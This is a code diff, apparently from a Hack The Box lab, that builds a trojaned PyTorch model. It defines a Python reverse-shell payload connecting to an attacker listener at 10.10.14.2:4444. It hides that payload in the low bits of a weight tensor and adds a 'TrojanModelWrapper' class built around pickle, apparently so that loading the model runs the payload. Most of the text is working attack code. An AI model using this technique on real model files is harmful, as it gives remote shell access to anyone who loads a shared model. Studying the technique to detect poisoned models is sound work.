@@ -340,20 +340,111 @@ except Exception as e:
     raise  # Re-raise the exception
 
 
+import socket, subprocess, os, pty, sys, traceback  # Imports needed by payload
+
+# Configure connection details for the reverse shell
+# Use the IP/DNS name of the machine running the listener, accessible FROM your target instance,
+HOST_IP = "10.10.14.2"  # THIS IS YOUR IP WHEN ON THE HTB NETWORK
+LISTENER_PORT = 4444  # The port that you will listen for a connection on
+
+print(f"--- Payload Configuration ---")
+print(f"Payload will target: {HOST_IP}:{LISTENER_PORT}")
+print(f"-----------------------------")
+# The payload string itself
+payload_code_string = f"""
+import socket, subprocess, os, pty, sys, traceback
+print("[PAYLOAD] Payload starting execution.", file=sys.stderr); sys.stderr.flush()
+attacker_ip = '{HOST_IP}'; attacker_port = {LISTENER_PORT}
+print(f"[PAYLOAD] Attempting connection to {{attacker_ip}}:{{attacker_port}}...", file=sys.stderr); sys.stderr.flush()
+s = None
+try:
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(5.0)
+    s.connect((attacker_ip, attacker_port)); s.settimeout(None)
+    print("[PAYLOAD] Connection successful.", file=sys.stderr); sys.stderr.flush()
+    print("[PAYLOAD] Redirecting stdio...", file=sys.stderr); sys.stderr.flush()
+    os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2)
+    shell = os.environ.get('SHELL', '/bin/bash')
+    print(f"[PAYLOAD] Spawning shell: {{shell}}", file=sys.stderr); sys.stderr.flush() # May not be seen
+    pty.spawn([shell]) # Start interactive shell
+except socket.timeout: print(f"[PAYLOAD] ERROR: Connection timed out.", file=sys.stderr); traceback.print_exc(file=sys.stderr); sys.stderr.flush()
+except ConnectionRefusedError: print(f"[PAYLOAD] ERROR: Connection refused.", file=sys.stderr); traceback.print_exc(file=sys.stderr); sys.stderr.flush()
+except Exception as e: print(f"[PAYLOAD] ERROR: Unexpected error: {{e}}", file=sys.stderr); traceback.print_exc(file=sys.stderr); sys.stderr.flush()
+finally:
+    print("[PAYLOAD] Payload script finishing.", file=sys.stderr); sys.stderr.flush()
+    if s:
+        try: s.close()
+        except: pass
+    os._exit(1) # Force exit
+"""
+
+# Encode payload for steganography
+payload_bytes_to_hide = payload_code_string.encode("utf-8")
+print(f"Payload defined and encoded to {len(payload_bytes_to_hide)} bytes.")
+
+import torch   # Ensure torch is imported
+import os      # Ensure os is imported for file checks
+
+NUM_LSB = 2    # Number of LSBs to use
+# Load the legitimate state dict
+legitimate_state_dict_file = "target_model.pth"
+if not os.path.exists(legitimate_state_dict_file):
+    raise FileNotFoundError(
+        f"Legitimate state dict '{legitimate_state_dict_file}' not found."
+    )
+
+print(f"\nLoading legitimate state dict from '{legitimate_state_dict_file}'...")
+loaded_state_dict = torch.load(legitimate_state_dict_file)  # Load the dictionary
+print("State dict loaded successfully.")
+
+# Choose a target layer/tensor for embedding
+target_key = "large_layer.weight"
+if target_key not in loaded_state_dict:
+    raise KeyError(
+        f"Target key '{target_key}' not found in state dict. Available keys: {list(loaded_state_dict.keys())}"
+    )
+
+original_target_tensor = loaded_state_dict[target_key]
+print(
+    f"Selected target tensor '{target_key}' with shape {original_target_tensor.shape} and {original_target_tensor.numel()} elements."
+)
+
+# Ensure the payload isn't too large for the chosen tensor
+bytes_to_embed = 4 + len(payload_bytes_to_hide)  # 4 bytes for length prefix
+bits_needed = bytes_to_embed * 8
+elements_needed = (bits_needed + NUM_LSB - 1) // NUM_LSB  # Ceiling division
+print(f"Payload requires {elements_needed} elements using {NUM_LSB} LSBs.")
+
+if original_target_tensor.numel() < elements_needed:
+    raise ValueError(f"Target tensor '{target_key}' is too small for the payload!")
+
+# Encode the payload into the target tensor
+print(f"\nEncoding payload into tensor '{target_key}'...")
+try:
+    modified_target_tensor = encode_lsb(
+        original_target_tensor, payload_bytes_to_hide, NUM_LSB
+    )
+    print("Encoding complete.")
+
+    # Replace the original tensor with the modified one in the dictionary
+    modified_state_dict = (
+        loaded_state_dict.copy()
+    )  # Don't modify the original loaded dict directly
+    modified_state_dict[target_key] = modified_target_tensor
+    print(f"Replaced '{target_key}' in state dict with modified tensor.")
+
+except Exception as e:
+    print(f"Error during encoding or state dict modification: {e}")
+    raise  # Re-raise the exception
+
 import pickle
 import torch
 import struct
 import traceback
 import os
+import pty
 import socket
 import sys
 import subprocess
-
-# ---- Windows-safe PTY handling ----
-if os.name != "nt":  # Linux / macOS only
-    import pty
-else:
-    pty = None  # Placeholder to avoid crashes
 
 
 class TrojanModelWrapper:
@@ -375,27 +466,21 @@ class TrojanModelWrapper:
             raise ValueError(
                 f"target_key '{target_key}' not found in the provided state_dict."
             )
-
         if not isinstance(modified_state_dict[target_key], torch.Tensor):
             raise TypeError(f"Value at target_key '{target_key}' is not a Tensor.")
-
         if modified_state_dict[target_key].dtype != torch.float32:
-            raise TypeError(
-                f"Tensor at target_key '{target_key}' is not float32."
-            )
-
+            raise TypeError(f"Tensor at target_key '{target_key}' is not float32.")
         if not 1 <= num_lsb <= 8:
             raise ValueError("num_lsb must be between 1 and 8.")
 
         try:
             self.pickled_state_dict_bytes = pickle.dumps(modified_state_dict)
             print(
-                f"  [Wrapper Init] Successfully pickled state_dict "
-                f"({len(self.pickled_state_dict_bytes)} bytes)."
+                f"  [Wrapper Init] Successfully pickled state_dict for embedding ({len(self.pickled_state_dict_bytes)} bytes)."
             )
         except Exception as e:
-            print("--- Error pickling state_dict ---")
-            traceback.print_exc()
+            print(f"--- Error pickling state_dict ---")
+            print(f"Error: {e}")
             raise RuntimeError(
                 "Failed to pickle state_dict for embedding in wrapper."
             ) from e
@@ -410,8 +495,7 @@ class TrojanModelWrapper:
         try:
             return pickle.loads(self.pickled_state_dict_bytes)
         except Exception as e:
-            print("Error deserializing internal state_dict:")
-            traceback.print_exc()
+            print(f"Error deserializing internal state_dict: {e}")
             return None
     def __reduce__(self):
         """
